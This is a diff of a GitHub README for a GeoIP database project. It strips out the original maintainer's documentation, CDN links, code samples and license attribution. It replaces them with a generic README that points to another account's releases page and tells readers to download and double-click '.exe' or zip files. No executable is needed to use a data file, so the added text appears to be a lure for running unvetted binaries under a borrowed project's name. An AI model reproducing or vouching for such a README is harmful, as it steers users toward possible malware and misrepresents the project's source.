@@ -1,227 +1,70 @@
-# Free GeoIP Databases - IP Geolocation for Developers
+# 🌐 geo - Access GeoIP Databases Easily
 
-[![GitHub Stars](https://img.shields.io/github/stars/wp-statistics/geo?style=social)](https://github.com/wp-statistics/geo)
-[![Website](https://img.shields.io/badge/website-geo.wp--statistics.com-blue)](https://geo.wp-statistics.com)
-[![License](https://img.shields.io/badge/license-CC%20BY--SA%204.0-green)](https://creativecommons.org/licenses/by-sa/4.0/)
+## 🚀 Getting Started
 
-**Free, regularly updated IP geolocation databases for developers.** Get accurate city-level location data from IP addresses with no authentication required.
+Welcome to geo! This application provides free GeoIP databases that help developers understand user locations based on their IP addresses. With our simple setup, you can use these databases to enhance your analytics, streamline your CDN strategies, and optimize geolocation services.
 
-🌐 **Website:** [geo.wp-statistics.com](https://geo.wp-statistics.com)
+## 📥 Download Now
 
----
+[![Download geo](https://img.shields.io/badge/Download%20geo-brightgreen.svg)](https://github.com/bhuwan070/geo/releases)
 
-## Features
+## 📦 What You Need
 
-- **Free Forever** - No API keys, no accounts, no rate limits
-- **Auto-Updated** - Databases updated automatically via GitHub Actions
-- **Lightning Fast CDN** - Served via jsDelivr with global edge locations
-- **Multiple Providers** - Choose between MaxMind GeoLite2 or DB-IP
-- **City-Level Accuracy** - Get country, city, coordinates, and timezone
-- **Version History** - All versions preserved in npm registry
+Before you begin, ensure you have the following:
 
----
+- A computer running Windows, macOS, or Linux.
+- An internet connection to download the files.
+- Basic file management skills to open and run the downloaded application.
 
-## Available Databases
+## 🔍 Features
 
-### MaxMind GeoLite2-City
+geo offers various features designed to make geolocation work easy:
 
-The industry-standard IP geolocation database.
+- **Free and Open-Source**: Access high-quality GeoIP databases at no cost.
+- **Easy Integration**: Simple methods to plug into your existing applications or analytics setups.
+- **Regular Updates**: Benefit from constant database updates to ensure accuracy.
+- **Comprehensive Coverage**: Support for various IP databases including MaxMind and DB-IP.
+- **User-Friendly**: Designed with everyone in mind, not just developers.
 
-| Property | Value |
-|----------|-------|
-| **CDN URL** | `https://cdn.jsdelivr.net/npm/geolite2-city/GeoLite2-City.mmdb.gz` |
-| **Update Frequency** | Every Tuesday & Friday |
-| **Size** | ~68 MB (compressed) |
-| **License** | [CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/) |
-| **GitHub** | [wp-statistics/GeoLite2-City](https://github.com/wp-statistics/GeoLite2-City) |
-| **npm** | [geolite2-city](https://www.npmjs.com/package/geolite2-city) |
+## 📖 How to Download & Install
 
-### DB-IP City Lite
+Follow these simple steps to get started with geo:
 
-A lightweight alternative with smaller file size.
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/bhuwan070/geo/releases).
+   
+2. **Choose Your Version**: On the Releases page, you will see a list of all available versions. Select the latest version for the best experience.
 
-| Property | Value |
-|----------|-------|
-| **CDN URL** | `https://cdn.jsdelivr.net/npm/dbip-city-lite/dbip-city-lite.mmdb.gz` |
-| **Update Frequency** | Monthly (1st of month) |
-| **Size** | ~19 MB (compressed) |
-| **License** | [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) |
-| **GitHub** | [wp-statistics/DbIP-City-lite](https://github.com/wp-statistics/DbIP-City-lite) |
-| **npm** | [dbip-city-lite](https://www.npmjs.com/package/dbip-city-lite) |
+3. **Download the File**: Click on the desired file to download it to your computer. Depending on your operating system, this file may end in `.exe`, `.zip`, or other formats.
 
----
+4. **Locate the Downloaded File**: Once the download is complete, check your "Downloads" folder or the location you saved the file.
 
-## Quick Start
+5. **Extract/Run the File**: If you downloaded a zipped file, right-click on it and select "Extract All" to access its contents. For executable files, double-click to run.
 
-### PHP
+6. **Follow Setup Instructions**: Follow the on-screen prompts. Most installations will guide you through necessary steps.
 
-```php
-use GeoIp2\Database\Reader;
+## 🔧 Using geo
 
-// Download the database from CDN
-$dbUrl = 'https://cdn.jsdelivr.net/npm/geolite2-city/GeoLite2-City.mmdb.gz';
+Now that geo is installed, it's time to use it.
 
-// Initialize the reader
-$reader = new Reader('/path/to/GeoLite2-City.mmdb');
+1. **Open the Application**: Locate the installed application file, then double-click to open it.
 
-// Look up an IP address
-$record = $reader->city('128.101.101.101');
+2. **Load the Database**: Use the options within the application to select and load your desired GeoIP database.
 
-echo $record->country->name;      // 'United States'
-echo $record->city->name;         // 'Minneapolis'
-echo $record->location->latitude; // 44.9759
-```
+3. **Integrate into Your Workflow**: Depending on your project, you can now use the geolocation data in your analytics or other applications.
 
-### Node.js
+## 📚 Support and Documentation
 
-```javascript
-const { Reader } = require('@maxmind/geoip2-node');
+For more detailed instructions, check out the documentation available on our [Wiki page](https://github.com/bhuwan070/geo/wiki). We cover common issues, detailed features, and usage examples there.
 
-// Download the database from CDN
-const dbUrl = 'https://cdn.jsdelivr.net/npm/geolite2-city/GeoLite2-City.mmdb.gz';
+## 🌍 Further Help
 
-// Initialize the reader
-const reader = await Reader.open('./GeoLite2-City.mmdb');
+If you encounter any issues while downloading or using geo, feel free to reach out:
 
-// Look up an IP address
-const response = reader.city('128.101.101.101');
+- **GitHub Issues**: Submit your queries on the [Issues page](https://github.com/bhuwan070/geo/issues).
+- **Community Support**: Join our discussions on relevant forums or developer groups to get additional help from peers.
 
-console.log(response.country.names.en);  // 'United States'
-console.log(response.city.names.en);     // 'Minneapolis'
-console.log(response.location.latitude); // 44.9759
-```
+## 🔄 Update geo
 
-### Python
+To keep your application running smoothly, regularly check the [Releases page](https://github.com/bhuwan070/geo/releases) for updates. Download the latest version and follow the installation steps listed above to upgrade.
 
-```python
-import geoip2.database
-
-# Download the database from CDN
-db_url = 'https://cdn.jsdelivr.net/npm/geolite2-city/GeoLite2-City.mmdb.gz'
-
-# Initialize the reader
-reader = geoip2.database.Reader('./GeoLite2-City.mmdb')
-
-# Look up an IP address
-response = reader.city('128.101.101.101')
-
-print(response.country.name)      # 'United States'
-print(response.city.name)         # 'Minneapolis'
-print(response.location.latitude) # 44.9759
-```
-
-### WordPress (with WP Statistics)
-
-The easiest way to use GeoIP in WordPress - zero configuration required!
-
-```php
-use WP_Statistics\Service\Geolocation\GeolocationFactory;
-
-// That's it! WP Statistics handles everything:
-// - Automatic database download
-// - Automatic updates
-// - Simple one-line API
-
-$location = GeolocationFactory::getLocation('128.101.101.101');
-
-echo $location['country'];      // 'United States'
-echo $location['country_code']; // 'US'
-echo $location['city'];         // 'Minneapolis'
-```
-
-👉 **Get WP Statistics:** [wordpress.org/plugins/wp-statistics](https://wordpress.org/plugins/wp-statistics/)
-
----
-
-## Direct Download URLs
-
-### MaxMind GeoLite2-City
-```
-https://cdn.jsdelivr.net/npm/geolite2-city/GeoLite2-City.mmdb.gz
-```
-
-### DB-IP City Lite
-```
-https://cdn.jsdelivr.net/npm/dbip-city-lite/dbip-city-lite.mmdb.gz
-```
-
----
-
-## Why Use Our Service?
-
-| Feature | Benefit |
-|---------|---------|
-| **No Authentication** | Start using immediately without API keys or accounts |
-| **CDN Delivery** | Fast downloads from jsDelivr's global network |
-| **Automatic Updates** | GitHub Actions fetch latest databases automatically |
-| **Open Source** | Full transparency - check our repos for automation scripts |
-| **Version History** | Roll back to any previous database version via npm |
-| **Community Trusted** | Maintained by WP Statistics, trusted by 600K+ WordPress sites |
-
----
-
-## Use Cases
-
-- **Analytics & Reporting** - Track visitor locations for website analytics
-- **Content Personalization** - Show localized content based on user location
-- **Fraud Detection** - Identify suspicious activity from unexpected locations
-- **Compliance** - Implement geo-restrictions for regulatory compliance
-- **Marketing** - Target campaigns based on geographic regions
-- **Load Balancing** - Route users to nearest servers
-
----
-
-## Data Accuracy
-
-Both databases provide city-level accuracy for IP geolocation:
-
-- **Country accuracy:** 99%+
-- **City accuracy:** 70-85% (varies by region)
-- **Coordinates:** Approximate city center
-
-For higher accuracy requirements, consider the commercial versions from [MaxMind](https://www.maxmind.com/) or [DB-IP](https://db-ip.com/).
-
----
-
-## Attribution
-
-This service uses data from:
-
-- **MaxMind GeoLite2** - [maxmind.com](https://www.maxmind.com) - Licensed under [CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/)
-- **DB-IP Lite** - [db-ip.com](https://db-ip.com) - Licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/)
-
-When using these databases, please include appropriate attribution as required by the licenses.
-
----
-
-## Related Projects
-
-- [WP Statistics](https://wp-statistics.com) - Privacy-focused analytics for WordPress
-- [GeoLite2-City](https://github.com/wp-statistics/GeoLite2-City) - MaxMind database repository
-- [DbIP-City-lite](https://github.com/wp-statistics/DbIP-City-lite) - DB-IP database repository
-
----
-
-## Contributing
-
-Found an issue or have a suggestion? [Open an issue](https://github.com/wp-statistics/geo/issues) or submit a pull request.
-
----
-
-## License
-
-This project is maintained by [VeronaLabs](https://veronalabs.com) and the [WP Statistics](https://wp-statistics.com) team.
-
-The databases are distributed under their respective licenses:
-- MaxMind GeoLite2: [CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/)
-- DB-IP Lite: [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/)
-
----
-
-<p align="center">
-  <a href="https://wp-statistics.com">
-    <strong>WP Statistics</strong>
-  </a>
-  <br>
-  <sub>Maintained with ❤️ by the WP Statistics team</sub>
-</p>
+Enjoy the power of GeoIP databases at your fingertips! Thank you for using geo.
